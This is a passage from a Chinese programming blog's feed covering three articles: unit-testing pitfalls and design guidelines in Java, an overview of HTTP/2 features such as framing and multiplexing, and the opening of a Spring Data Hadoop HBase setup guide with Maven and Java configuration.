&lt;h4 id="有关于抛出异常的测试">有关于抛出异常的测试。&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">exceptionTest&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;准备开始执行非法的业务处理逻辑&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">new&lt;/span> Environment&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">include&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;不存在的环境变量&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Exception e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
assertThat&lt;span style="color:#f92672">(&lt;/span>e&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMessage&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> containsString&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;不存在的环境变量&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们期望在传入不存在的环境变量时运行报错，出现异常并且断言异常。但是若没有出现异常时，此测试依然能顺利结束，让我们误以为测试通过。
增加 fail() 方法调用，使上面的测试正确的达成我们的期望。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">exceptionFailTest&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;准备开始执行非法的业务处理逻辑&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">new&lt;/span> Environment&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">include&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;不存在的环境变量&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
fail&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;运行失败，未抛出期望的异常&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Exception e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
assertThat&lt;span style="color:#f92672">(&lt;/span>e&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMessage&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> containsString&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;不存在的环境变量&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="没有断言的测试">没有断言的测试&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 测试获取还款计划的方法
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @throws ServiceException exp
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">testGetRepayPlan&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> ServiceException &lt;span style="color:#f92672">{&lt;/span>
String loanNo &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;201710240000021213&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// 查询提款信息
&lt;/span>&lt;span style="color:#75715e">&lt;/span> DrawMoneyInfoVO drawMoneyInfoVO &lt;span style="color:#f92672">=&lt;/span> commCustBaseInfoServiceImpl&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">queryDrawMoneyInfoByLoanNo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>loanNo&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">warn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;由于测试获取还款计划的方法 testGetRepayPlan 未查询到提款合同，测试未运行&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
CommCustBaseInfoVO commCustBaseInfoVO &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> CommCustBaseInfoVO&lt;span style="color:#f92672">();&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setLoanNo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getLoanNo&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setMainLoanNo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMainLoanNo&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setUserName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setIdCard&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getIdCard&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setLoanPurpose&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getLoanPurposeCN&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setAmount&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getAmount&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setRepaymentMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getRepaymentMethod&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setProductNo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getProductCode&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setProductVersion&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getProductVersion&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setRepaymentIssue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getRepaymentIssue&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setSignTime&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> Date&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setLoanMode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getLoanMode&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setPhone&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getPhone&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setChannel&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getChannel&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
commCustBaseInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setPartnerOrderId&lt;/span>&lt;span style="color:#f92672">(&lt;/span>drawMoneyInfoVO&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getPartnerOrderId&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
List&lt;span style="color:#f92672">&amp;lt;&lt;/span>RepayPlanDetail&lt;span style="color:#f92672">&amp;gt;&lt;/span> list &lt;span style="color:#f92672">=&lt;/span> simulatedCalculateService&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getRepayPlan&lt;/span>&lt;span style="color:#f92672">(&lt;/span>commCustBaseInfoVO&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们将修复这个快乐测试的任务留给各位亲爱的读者朋友们。给自己一些时间，想想应该从哪些点入手进行修改。&lt;/p>
&lt;ol>
&lt;li>删除多余的查询。&lt;/li>
&lt;li>删除条件逻辑。&lt;/li>
&lt;li>增加断言。&lt;/li>
&lt;li>断言应该断言更加具体的内容。&lt;/li>
&lt;li>搞清楚自己测试的范围是什么。将需要测试的数据和协作对象隔离开来，使测试保证单一职责原则。&lt;/li>
&lt;li>最大的需要解决的问题，使还款计划的设计更加的可测。使用伪造对象替代 dao 层，保证利率信息在各环境都能获取到值并且计算出期望的结果。&lt;/li>
&lt;/ol>
&lt;h2 id="优秀单元测试设计指南">优秀单元测试设计指南&lt;/h2>
&lt;p>学习完了上述测试的坏味道再加上适当的实践，就可以编写出合格的单元测试的。
但是，要设计出优秀的单元测试只是避开坏味道是不够的。下面这些设计指南能够帮助你更上一层楼，写出优秀的测试代码！&lt;/p>
&lt;h3 id="复杂逻辑的方法不应该成为私有方法">复杂逻辑的方法不应该成为私有方法。&lt;/h3>
&lt;p>private 的私有方法无法被外部访问，这对单元测试带来了困难。并不是说所有方法都不应该使用 private 方法。而是 private 方法应该尽可能短小，简单，其存在的目的是为了使 public 方法更易读。&lt;/p>
&lt;h3 id="避免-final-方法">避免 final 方法。&lt;/h3>
&lt;p>无法被覆盖以及定义为 static 的方法无法被打桩。不要去纠结 final 关键字的性能，但是当你出于维护目的编写 final 方法的时候，请考虑这个方法将来是否可能需要被打桩。&lt;/p>
&lt;h3 id="警惕使用-new-关键字">警惕使用 new 关键字。&lt;/h3>
&lt;p>因为在 new 关键字中已经指定了具体实现。今后会很难替换了。调用对象的方法时尽可能的使用注入的对象，利用组合解决问题。&lt;/p>
&lt;h3 id="隔离与测试无关的协作者">隔离与测试无关的协作者。&lt;/h3>
&lt;p>每个方法都完成一件事情，每个测试都测试一件事情。保持测试方法的单一职责。&lt;/p>
&lt;h3 id="不要使用测试基类使用-beforeclass-代替-before">不要使用测试基类。使用 BeforeClass 代替 Before。&lt;/h3>
&lt;p>before 注解在每个测试类的每个测试方法运行之前，都会运行一次。所以当你的初始化工作确定只需要一次时，请使用 BeforeClass 代替 Before。
另外请不要使用测试基类。junit 在运行测试时会扫描 Before 注解遍历到最高父级。所以你的每个测试子类都可能运行 Before 注解很多次。&lt;/p>
&lt;h2 id="结语">结语&lt;/h2>
&lt;p>要想写出优雅的单元测试除了理论知识以外，大量实践是必不可少的。写测试的思路不同于单纯的业务逻辑开发。如果你觉得你的代码写的还行，那么现在就开始尝试 TDD 编程吧，一段时间过后你会和我一样，惊讶于之前的代码中竟然充满了糟糕透顶的设计，并庆幸自己使用 TDD 的时间还不算晚。&lt;/p>
&lt;hr>
&lt;p>《有效的单元测试》 Lasse Koskela&lt;/p></description></item><item><title>简述 Http/2</title><link>https://www.chucklin.net/post/http2/</link><pubDate>Sat, 25 Jan 2020 09:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/http2/</guid><description>&lt;h2 id="先谈谈-http09-http10">先谈谈 Http/0.9 Http/1.0&lt;/h2>
&lt;p>Http 最初来源于一个构想，即设计一个用于记录、查找和阅读 「由于大量的书面材料或图像材料以复杂的方式相互联系，因此不便在纸介质上呈现或展示」的信息的通用系统。 这个通用系统，由服务器和众多浏览器所组成。&lt;/p>
&lt;p>最初的 Http/0.9 基本上只有 Get 方法，没有首部，它只是被用来获取 HTML。经过几年的发展，Http/1.0 在 0.9 的基础上增加了首部、响应码、重定向等功能。&lt;/p>
&lt;h2 id="广泛使用的-http11">广泛使用的 Http/1.1&lt;/h2>
&lt;p>Http/1.0 有很多问题，如每次通信后关闭连接，缓存首部设计简陋等等。为了应对快速膨胀的互联网 ，Http/1.1 接踵而至。1.1 版本带来了连接复用与缓存首部的扩展等等改进，大大提升了 web 服务器的性能。&lt;/p>
&lt;h2 id="http11-的问题">Http/1.1 的问题&lt;/h2>
&lt;p>时至今日，基于 Http/1.1 的互联网相比之前已经发生了天翻地覆的变化， 网站从最开始的只有文字，进化到现在的社交、直播等等 web 应用的同时，提供支持的 Http/1.1 却没有发生任何改变。由于时代背景的局限性，曾经设计上的小缺陷在当前的互联网环境下，对性能的影响变得愈发严重。&lt;/p>
&lt;h3 id="队头阻塞">队头阻塞&lt;/h3>
&lt;p>现代 web 应用除了文字以外，还包含各种 css、js、图片、甚至视频信息。Http1 协议没有提供真正意义上的同时请求多个资源的功能。如果在接受某个请求的响应时发生了延迟，那其后的所有请求都会被阻塞。即使现代浏览器会针对同一个域名一次性建立 6 个连接，但每个链接中的请求与响应如果发生异常的话，依然会产生后续请求被阻塞的问题。&lt;/p>
&lt;h3 id="低效的-tcp-利用">低效的 TCP 利用&lt;/h3>
&lt;p>Tcp 的核心思想是保证统一网络中的不同应用占用流量的「公平性」以及连接的「可用性」。为了保证公平与与可用，Tcp 的核心要素除了三次握手以外，还设计了「慢启动」来尽可能减轻网络连接的负担。&lt;/p>
&lt;blockquote>
&lt;p>慢启动的设计目标是为了让新连接搞清楚当前网络状况，避免给已经拥堵的网络继续添乱。在给定的拥塞窗口下，它允许发送者在网络条件良好的情况下，每下一次发送的数据按照窗口大小为指数进行增加。传统 TCP 实现利用拥塞控制算法会根据数据包的丢失来反馈调整。如果数据包确认丢失了，算法就会缩小拥塞窗口。&lt;/p>
&lt;/blockquote>
&lt;h3 id="首部信息臃肿">首部信息臃肿&lt;/h3>
&lt;p>据 HTTP 历史存档记录，2016 年末，请求首部一般集中在 460 字节左右。对于包含 140 个资源的普通 Web 页面，意味着它在发起的所有请求中大约占 63KB。想想之前关于 TCP 拥塞窗口管理的讨论，发送该页面相关的所有请求可能需要 3~4 轮往返，因此网络延迟的损耗会被迅速放大。此外，上行带宽通常会受到网络限制，尤其是在移动网络环境中，于是拥塞窗口机制根本来不及起作用，导致更多的请求和响应。&lt;/p>
&lt;h2 id="http2-协议的特点">Http2 协议的特点&lt;/h2>
&lt;p>现在来看看 Http2 如何解决上述问题。&lt;/p>
&lt;h3 id="二进制协议">二进制协议&lt;/h3>
&lt;p>HTTP/2 是基于二进制的协议。在设计上取消了类似 Http1 那样的通过分隔符来区分首部和消息体的做法。
HTTP/2 大致可以分为两部分：分帧层，即 h2 多路复用能力的核心部分；数据或 http 层，其中包含传统上被认为是 HTTP 及其关联数据的部分。&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/mikumikulch/pictures/master/20200122145527.jpg" alt="">&lt;/p>
&lt;h4 id="帧结构">帧结构&lt;/h4>
&lt;p>前 9 个字节对于每个帧是一致的。解析时只需要读取这些字节，就可以准确地知道在整个帧中期望的字节数。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Type 字段
代表帧类型。Type 字段为 HEADERS 代表首部信息帧；DATA 类型代表核心内容信息帧；SETTINGS 字段代表协商连接级参数信息帧。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Length 字段
与 Http1 服务端无法获取首部信息大小情况不同，服务端根据 Length 字段可以得知帧信息中的内容的长度。这给服务端分配合理缓存空间读取首部信息的处理带来了便利。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Stream Identifier
流 ID（帧首部的第 6~9 字节）用来标识帧所属的流。「HTTP/2 连接上独立的、双向的帧序列交换。」你可以将流看作在连接上的一系列帧，它们构成了单独的 HTTP 请求和响应&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="多路复用">多路复用&lt;/h3>
&lt;p>因为有分帧和流 ID 的设计，H2 具备了多路复用的能力。现在浏览器可以针对复数个资源只开启一个连接，并且不用等待服务端响应，就批量将请求快速提交到服务端。多个请求和响应可以交错，而不会互相阻塞。&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/mikumikulch/pictures/master/20200122161547.png" alt="">&lt;/p>
&lt;h3 id="首部压缩">首部压缩　　&lt;/h3>
&lt;p>仅仅使用二进制协议似乎还不够，h2 的首部还会被深度压缩。这将显著减少传输中的冗余字节。&lt;/p>
&lt;h3 id="服务端推送">服务端推送&lt;/h3>
&lt;p>提升单个对象性能的最佳方式，就是在它被用到之前就放到浏览器的缓存里面。拿一个简单的 HTML 页面来说，如果服务器接收到一个页面的请求，它需要决定是推送页面上的资源还是等客户端来请求。如果服务器选择正确，那就真的有助于提升页面的整体性能，反之则会损耗页面性能。&lt;/p>
&lt;h2 id="最后">最后&lt;/h2>
&lt;p>从 Http2 诞生距今，大量网站都完成了对它的支持工作。实践证明在某些网站上启用 Http2 的确可让性能提高 30%以上。但最好的办法是尽可能详细的测试启用 Http2 所带来的风险和收益之后，再做出决定。&lt;/p></description></item><item><title>为什么选择 Spring data hadoop</title><link>https://www.chucklin.net/post/spring_data_hadoop/</link><pubDate>Mon, 20 Jan 2020 09:23:00 +0800</pubDate><guid>https://www.chucklin.net/post/spring_data_hadoop/</guid><description>&lt;p>hbase 常见的操作方式有以下三种：&lt;/p>
&lt;h3 id="native-api">Native Api&lt;/h3>
&lt;p>原生 api 操作繁琐，就像用 JDBC 操作关系型数据库一样，类似 flush、submit、close 的使用让人眼花缭乱。如果碰巧你的应用程序使用 java 开发，那就又多了一条不使用 Native Api 的理由 —— 在问题周围兜一个圈子再解决才是真正的 java 式设计。&lt;/p>
&lt;h3 id="phoenix">Phoenix&lt;/h3>
&lt;p>apache 提供的 phoenix 提供了 mybatis-like 的支持，帮你「隐藏」了行键的麻烦，还支持在 mapper 文件中像操作关系型数据库一样，直接创建某个字段的索引，以优化大量数据操作时可能产生的性能问题。&lt;/p>
&lt;p>这实在是太「夸张」了。在我有限的认知中不记得 Hbase 原生支持这样的功能。尽管我的目的只是「简单的操作 Hbase」，却还是怀着对 phenix 项目的崇敬，下载了相关依赖导入项目中。&lt;/p>
&lt;p>可是结果让我失望。hbase-client.jar、hbase-server.jar、phoenix-core .jar 这三者在导入项目后产生了大量的依赖冲突。在我尝试了各种冲突排查手段都无解正焦头烂额时，先哲的一句话将我从泥潭拉了出来：&lt;/p>
&lt;blockquote>
&lt;p>当你在一件事情上遇到困难时，就放弃这件事。 —— 鲁迅&lt;/p>
&lt;/blockquote>
&lt;h3 id="spring-data-hadoop">Spring data hadoop&lt;/h3>
&lt;p>我的目的毕竟只是「简单的操作 Hbase」。而 spring data 使用 Hbase 所需配置不过一行，还没有讨厌的 checked exception，更不会提供某些「夸张」的功能，最重要的是没有依赖冲突！这些特点深深的打动了我。&lt;/p>
&lt;h2 id="如何配置-spring-data-hadoop">如何配置 Spring data hadoop&lt;/h2>
&lt;p>&lt;strong>配置 spring data hadoop 分 3 步。&lt;/strong>&lt;/p>
&lt;p>&lt;strong>第一步：导入依赖包。&lt;/strong>&lt;/p>
&lt;p>exclusion 选项最好根据你自己的情况来配置，重点注意 hbase-client 相关的版本一定要使用 1.2.0 以上，不然可能会和项目中既存的 guava 包产生冲突。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-xml" data-lang="xml">&lt;span style="color:#f92672">&amp;lt;dependency&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;groupId&amp;gt;&lt;/span>org.springframework.data&lt;span style="color:#f92672">&amp;lt;/groupId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;artifactId&amp;gt;&lt;/span>spring-data-hadoop&lt;span style="color:#f92672">&amp;lt;/artifactId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;version&amp;gt;&lt;/span>2.5.0.RELEASE&lt;span style="color:#f92672">&amp;lt;/version&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;exclusions&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;exclusion&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;groupId&amp;gt;&lt;/span>org.apache.zookeeper&lt;span style="color:#f92672">&amp;lt;/groupId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;artifactId&amp;gt;&lt;/span>zookeeper&lt;span style="color:#f92672">&amp;lt;/artifactId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;/exclusion&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;/exclusions&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;/dependency&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;dependency&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;groupId&amp;gt;&lt;/span>org.apache.hbase&lt;span style="color:#f92672">&amp;lt;/groupId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;artifactId&amp;gt;&lt;/span>hbase-client&lt;span style="color:#f92672">&amp;lt;/artifactId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;version&amp;gt;&lt;/span>1.3.0&lt;span style="color:#f92672">&amp;lt;/version&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;exclusions&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;exclusion&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;groupId&amp;gt;&lt;/span>org.slf4j&lt;span style="color:#f92672">&amp;lt;/groupId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;artifactId&amp;gt;&lt;/span>slf4j-log4j12&lt;span style="color:#f92672">&amp;lt;/artifactId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;/exclusion&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;exclusion&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;groupId&amp;gt;&lt;/span>log4j&lt;span style="color:#f92672">&amp;lt;/groupId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;artifactId&amp;gt;&lt;/span>log4j&lt;span style="color:#f92672">&amp;lt;/artifactId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;/exclusion&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;exclusion&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;groupId&amp;gt;&lt;/span>org.apache.curator&lt;span style="color:#f92672">&amp;lt;/groupId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;artifactId&amp;gt;&lt;/span>curator-x-discovery&lt;span style="color:#f92672">&amp;lt;/artifactId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;/exclusion&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;exclusion&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;groupId&amp;gt;&lt;/span>org.apache.zookeeper&lt;span style="color:#f92672">&amp;lt;/groupId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;artifactId&amp;gt;&lt;/span>zookeeper&lt;span style="color:#f92672">&amp;lt;/artifactId&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;/exclusion&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;/exclusions&amp;gt;&lt;/span>
&lt;span style="color:#f92672">&amp;lt;/dependency&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>第二步：编写相关配置。&lt;/strong>&lt;/p>
&lt;p>&lt;a href="https://docs.spring.io/spring-hadoop/docs/1.0.1.RC1/reference/html/hbase.html">spring 官方文档  Working with HBase&lt;/a> 只提供了 xml 配置示例，这让我十分头疼，毕竟不是谁都有心情去看源码的。但考虑到 spring boot 的项目最好还是用 java configuration 为好，所以只好提供一个非官方配置供参考使用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">HbaseConfiguration&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Bean&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> HbaseTemplate &lt;span style="color:#a6e22e">hbaseTemplate&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
org&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">apache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">hadoop&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">conf&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">Configuration&lt;/span> configuration &lt;span style="color:#f92672">=&lt;/span> HBaseConfiguration&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">create&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
